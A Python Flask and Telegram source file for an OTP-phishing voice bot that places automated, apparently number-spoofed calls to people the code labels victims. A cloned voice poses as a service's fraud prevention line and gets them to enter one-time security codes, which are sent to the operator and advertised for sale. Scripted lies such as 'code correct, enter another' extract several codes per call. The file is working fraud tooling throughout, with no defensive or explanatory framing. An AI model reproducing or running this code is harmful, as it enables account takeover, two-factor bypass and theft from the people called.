from library import *
from info import *
from connection import *
from functions import *
from datetime import datetime

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/call/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def call(number, spoof, service, name, digit, chat_id):
    resp = VoiceResponse()
    
    choice = request.values['AnsweredBy']
    
    # Handle machine detection
    if choice == 'human' or choice == 'unknown':
        message = " 👤 Human detected"
        bot.send_message(chat_id, message)
        response = VoiceResponse()


        gather = Gather(
            num_digits=1,
            action=f'/gather-input/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
            timeout=60
        )
        gather.say(f"Hello {name}, this is the {service} fraud prevention line. We have sent this automated call because of an attempt to change the number of your {service} account. If this was not you, please press 1.",voice='Google.en-US-Wavenet-H')
        response.append(gather)
        response.say("No input received. Goodbye.")
        response.hangup()
        return str(response)
 

    elif choice == 'machine' or choice == 'fax' or choice == 'machine_start' or choice == 'fax_start':
        message = " 🤖 Voicemail Detected"
        bot.send_message(chat_id, message)
        resp.hangup()
        return str(resp)
    elif choice == 'machine_end_silence':
        message = " 🔊 Silent Human detection"
        bot.send_message(chat_id, message)
        gather = Gather(
            num_digits=1,
            action=f'/gather-input/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
            timeout=60
        )
        gather.say(f'Hello {name}, this is the {service} fraud prevention line. We have sent this automated call because of an attempt to change the number of your {service} account. If this was not you, please press 1.',voice='Google.en-US-Wavenet-H')
        response.append(gather)
        response.say("No input received. Goodbye.")
        response.hangup()
        return str(response)
    else:
        message = f'{choice}'
        bot.send_message(chat_id, message)
        return ''
    
    

@app.route('/statuscallback/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def statuscallback(number, spoof, service, name, digit, chat_id):
    if 'CallStatus' in request.values:
        status = request.values['CallStatus']
        try:
            # Handle call status
            if status == 'ringing':
                markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Hang Up", callback_data=f"hangup")]
                ])
                bot.send_message(chat_id, f"📞 Call is ringing...", reply_markup=markup)

                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'ringing'}},
                    upsert=True
                )

            elif status == 'in-progress':
                bot.send_message(chat_id, ' 🤳  Call has been answered.')

                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'in-progress'}},
                    upsert=True
                )

            elif status == 'completed':
                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'ended'}},
                    upsert=True
                )
                balance = twilio_client.balance.fetch()

                bot.send_message(chat_id,f"☎️ Call has ended.\n\n{balance.balance} {balance.currency}")
                
            elif status == 'failed':
                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'ended'}},
                    upsert=True
                )
                bot.send_message(chat_id, "📵 Call failed.")
            elif status == 'busy':
                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'ended'}},
                    upsert=True
                )
                bot.send_message(chat_id, "📵 Call busy.")
            elif status == 'no-answer':
                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'ended'}},
                    upsert=True
                )
                bot.send_message(chat_id, "📵 No answer.")
            elif status == 'canceled':
                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'ended'}},
                    upsert=True
                )
                bot.send_message(chat_id, "📵 Call canceled.")
            else:
                calls_db.update_one(
                    {'_id': int(chat_id)},
                    {'$set': {'status': 'ended'}},
                    upsert=True
                )
                bot.send_message(chat_id, f"📞 Call status: {status}")
        except:
            bot.send_message(chat_id, "Sorry an error has occured\nContact Admin @XSE_C")
            resp = VoiceResponse()
            resp.hangup()
            return str(resp)
        else:
            return 'ok'
    else:
        return 'ok'
    
@app.route('/details_rec/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def details_rec(number, spoof, service, name, digit, chat_id):
    call_sid = request.form.get('CallSid')
    recording_url = request.form.get('RecordingUrl')
    
    if 'RecordingUrl' in request.values:
        file_name = f"recording_{call_sid}.mp3"
        if download_recording(recording_url, file_name):
            if send_recording_to_telegram(file_name, chat_id):
                print("Recording sent to Telegram successfully.")
            os.remove(file_name)
            return jsonify({"message": "Recording processed and sent successfully"}), 200
        else:
            return jsonify({"error": "Failed to download recording"}), 500

@app.route('/gather-input/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def gather_input(number, spoof, service, name, digit, chat_id):
    try:
        pressed_digit = request.form.get('Digits')

        response = VoiceResponse()

        if pressed_digit == '1':
            bot.send_message(chat_id, f" 📲  Victim pressed 1, Send OTP...")

            gather = Gather(num_digits=int(digit), action=f'/verify-otp/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}', timeout=30)
            gather.say(f"To ensure the security of your account, please enter the {digit}-digit security code that has been sent to your mobile device.",voice='Google.en-US-Wavenet-H')
            response.append(gather)

            response.say("No input received. Goodbye.")
            response.hangup()
        else:
            response.say("Invalid input. Goodbye.")
            response.hangup()

        return str(response)

    except Exception as e:
        print(f"Error in gather_input: {e}")
        return '', 500  

@app.route('/verify-otp/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def verify_otp(number, spoof, service, name, digit, chat_id):
    try:
        # Extract the OTP entered by the user
        otp = request.form.get('Digits')

        # Create TwiML response
        response = VoiceResponse()

        # Send the OTP to Telegram with Accept/Deny buttons in one line
        markup = InlineKeyboardMarkup([
    [InlineKeyboardButton("Accept", callback_data="accept"),
     InlineKeyboardButton("Deny", callback_data="deny"),
     InlineKeyboardButton("Second", callback_data="second"),
     InlineKeyboardButton("Third", callback_data="third"),
     InlineKeyboardButton("Minus", callback_data="minus")]
])

        message = f"⭐️Success\n├ ✅ OTP: {otp} DM @xse_c TO BUY\n└ 📦 Target: {service}"
        bot.send_message(group_vouchers_id, message)
        sent_message = bot.send_message(chat_id, f'🔐 OTP: {otp}\nVerify It ...', reply_markup=markup)

        # Extract the message_id from the sent message
        message_id = sent_message.message_id

        # Update the database with the OTP and message_id
        calls_db.update_one(
            {'_id': int(chat_id)},
            {'$set': {'status': 'otp_sent', 
                      'otp': otp, 
                      'message_id': message_id,
                      'name': name,
                      'number': number,
                      'service': service,
                      'spoof': spoof,
                      'digit': digit}},
            upsert=True
        )

        # Ask the user to wait while verifying the code
        response.say("Please hold while we verify your code. Thank you for your patience.")

        # Play a waiting sound to keep the call alive
        response.play("https://drive.google.com/uc?export=download&id=1SycFkbZink6196Y8EF0FJ6i3s9LzrCzC")  # Replace with your actual sound file URL
        # Return the TwiML response to Twilio
        return str(response)

    except Exception as e:
        # Log the error
        print(f"Error in verify_otp: {e}")
        return '', 500  # Return a 500 error to Twilio

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    
    if call.data == 'hangup':
        # Get the OTP from the database
        call_control_id = calls_db.find_one({'_id': chat_id})['call_control_id']
        twilio_client.calls(call_control_id).update(status='completed')
    
    elif call.data == 'accept':
        # Fetch data from the database
        call_data = calls_db.find_one({'_id': chat_id})
        message_id = call_data['message_id']
        call_control_id = call_data['call_control_id']
        otp = call_data['otp']

        # Update the message in Telegram
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"✅ OTP: {otp}\n🔑 Code has Been accepted",
            reply_markup=None  # Remove the reply markup
        )

        # Create a TwiML response to stop the waiting sound and provide feedback
        response = VoiceResponse()
        response.say("Code verified successfully. Your account has been confirmed and secured! Thank you for trusting us with your security.",voice='Google.en-US-Wavenet-H')
        response.hangup()

        # Update the call status in the database
        calls_db.update_one(
            {'_id': chat_id},
            {'$set': {'status': 'accepted'}}
        )

        # Send the TwiML response to Twilio to end the call
        twilio_client.calls(call_control_id).update(
            twiml=str(response)
        )
    
    elif call.data == 'deny':
        # Fetch data from the database
        call_data = calls_db.find_one({'_id': chat_id})
        number = call_data['number']
        spoof = call_data['spoof']
        service = call_data['service']
        name = call_data['name']
        digit = call_data['digit']
        if not call_data:
            print(f"Call data not found for chat_id: {chat_id}")
            return
        
        call_control_id = call_data.get('call_control_id')
        if not call_control_id:
            print(f"call_control_id not found for chat_id: {chat_id}")
            return
        
        message_id = call_data['message_id']
        otp = call_data['otp']

        # Update the message in Telegram
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"❌ OTP: {otp}\n🛑 Code has Been denied",
            reply_markup=None  # Remove the reply markup
        )
        bot.send_message(chat_id, "🛰️ Placing victim back to IVR.")
        calls_db.update_one(
            {'_id': chat_id},
            {'$set': {'status': 'denied'}}
        )
    
    
        # Create a TwiML response to stop the waiting sound and provide feedback
        response = VoiceResponse()
        response.redirect(f'{ngrok_url}/deny-call/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}')
        try:
            twilio_client.calls(call_control_id).update(
                twiml=str(response)
            )
            print(f"TwiML response sent to Twilio for call_control_id: {call_control_id}")
        except Exception as e:
            print(f"Error updating Twilio call: {e}")
        return str(response)
    
    elif call.data == 'second':
        # Fetch data from the database
        call_data = calls_db.find_one({'_id': chat_id})
        number = call_data['number']
        spoof = call_data['spoof']
        service = call_data['service']
        name = call_data['name']
        digit = call_data['digit']
        if not call_data:
            print(f"Call data not found for chat_id: {chat_id}")
            return
        
        call_control_id = call_data.get('call_control_id')
        if not call_control_id:
            print(f"call_control_id not found for chat_id: {chat_id}")
            return
        
        message_id = call_data['message_id']
        otp = call_data['otp']

        # Update the message in Telegram
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"✅ OTP: {otp}\n🛑 Request More Code",
            reply_markup=None  # Remove the reply markup
        )
        bot.send_message(chat_id, "🛰️ Placing victim back to IVR.")
        calls_db.update_one(
            {'_id': chat_id},
            {'$set': {'status': 'denied'}}
        )
    
    
        # Create a TwiML response to stop the waiting sound and provide feedback
        response = VoiceResponse()
        response.redirect(f'{ngrok_url}/second-code/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}')
        try:
            twilio_client.calls(call_control_id).update(
                twiml=str(response)
            )
            print(f"TwiML response sent to Twilio for call_control_id: {call_control_id}")
        except Exception as e:
            print(f"Error updating Twilio call: {e}")
        return str(response)
    elif call.data == 'third':
        # Fetch data from the database
        call_data = calls_db.find_one({'_id': chat_id})
        number = call_data['number']
        spoof = call_data['spoof']
        service = call_data['service']
        name = call_data['name']
        digit = call_data['digit']
        if not call_data:
            print(f"Call data not found for chat_id: {chat_id}")
            return
        
        call_control_id = call_data.get('call_control_id')
        if not call_control_id:
            print(f"call_control_id not found for chat_id: {chat_id}")
            return
        
        message_id = call_data['message_id']
        otp = call_data['otp']

        # Update the message in Telegram
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"✅ OTP: {otp}\n🛑 Request More Code",
            reply_markup=None  # Remove the reply markup
        )
        bot.send_message(chat_id, "🛰️ Placing victim back to IVR.")
        calls_db.update_one(
            {'_id': chat_id},
            {'$set': {'status': 'denied'}}
        )
    
    
        # Create a TwiML response to stop the waiting sound and provide feedback
        response = VoiceResponse()
        response.redirect(f'{ngrok_url}/third-code/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}')
        try:
            twilio_client.calls(call_control_id).update(
                twiml=str(response)
            )
            print(f"TwiML response sent to Twilio for call_control_id: {call_control_id}")
        except Exception as e:
            print(f"Error updating Twilio call: {e}")
        return str(response)
    elif call.data == 'minus':
        # Fetch data from the database
        call_data = calls_db.find_one({'_id': chat_id})
        number = call_data['number']
        spoof = call_data['spoof']
        service = call_data['service']
        name = call_data['name']
        digit = call_data['digit']
        if not call_data:
            print(f"Call data not found for chat_id: {chat_id}")
            return
        
        call_control_id = call_data.get('call_control_id')
        if not call_control_id:
            print(f"call_control_id not found for chat_id: {chat_id}")
            return
        
        message_id = call_data['message_id']
        otp = call_data['otp']

        # Update the message in Telegram
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"❌ OTP: {otp}\n🛑 Code Is minus",
            reply_markup=None  # Remove the reply markup
        )
        bot.send_message(chat_id, "🛰️ Placing victim back to IVR.")
        calls_db.update_one(
            {'_id': chat_id},
            {'$set': {'status': 'denied'}}
        )
    
    
        # Create a TwiML response to stop the waiting sound and provide feedback
        response = VoiceResponse()
        response.redirect(f'{ngrok_url}/minus-code/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}')
        try:
            twilio_client.calls(call_control_id).update(
                twiml=str(response)
            )
            print(f"TwiML response sent to Twilio for call_control_id: {call_control_id}")
        except Exception as e:
            print(f"Error updating Twilio call: {e}")
        return str(response)
    
@app.route('/deny-call/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def deny_call(number, spoof, service, name, digit, chat_id):
    response = VoiceResponse()
    response.say("The code you entered is incorrect. This may be due to an error on our end. Please double-check and enter the correct code.",voice='Google.en-US-Wavenet-H')
    gather = Gather(
        num_digits=int(digit),
        action=f'/verify-otp/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
        timeout=30
    )
    response.append(gather)
    response.say("No input received. Goodbye.")
    response.hangup()
    return str(response)

@app.route('/second-code/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def second_code(number, spoof, service, name, digit, chat_id):
    response = VoiceResponse()
    response.say("The code you entered is correct. For added security, we will send another code to ensure your account remains protected. Please enter the new code sent to your device.",voice='Google.en-US-Wavenet-H')
    gather = Gather(
        num_digits=int(digit),
        action=f'/verify-otp/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
        timeout=30
    )
    response.append(gather)
    response.say("No input received. Goodbye.")
    response.hangup()
    return str(response)

@app.route('/third-code/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def third_code(number, spoof, service, name, digit, chat_id):
    response = VoiceResponse()
    response.say("The second code has been successfully verified. To complete securing your account, please enter the final security code sent to your device.",voice='Google.en-US-Wavenet-H')
    gather = Gather(
        num_digits=int(digit),
        action=f'/verify-otp/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
        timeout=30
    )
    response.append(gather)
    response.say("No input received. Goodbye.")
    response.hangup()
    return str(response)

@app.route('/minus-code/<number>/<spoof>/<service>/<name>/<digit>/<chat_id>', methods=['POST'])
def minus_code(number, spoof, service, name, digit, chat_id):
    response = VoiceResponse()
    response.say("The code you entered is either incorrect or incomplete, which may be due to an error on our side. Please request and enter a new code to confirm your identity. We appreciate your patience and understanding!",voice='Google.en-US-Wavenet-H')
    gather = Gather(
        num_digits=int(digit),
        action=f'/verify-otp/{number}/{spoof}/{service}/{name}/{digit}/{chat_id}',
        timeout=30
    )
    response.append(gather)
    response.say("No input received. Goodbye.")
    response.hangup()
    return str(response)

@app.route('/', methods=['POST', 'GET'])
def webhook():
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            try:
                update = telebot.types.Update.de_json(json_string)
                bot.process_new_updates([update])
            except KeyError as e:
                print(f"KeyError: {e}")
            return ''
        else:
            print("error")
            abort(403)

    except Exception as e:
        print(f"Error in webhook: {e}")
        return '', 500  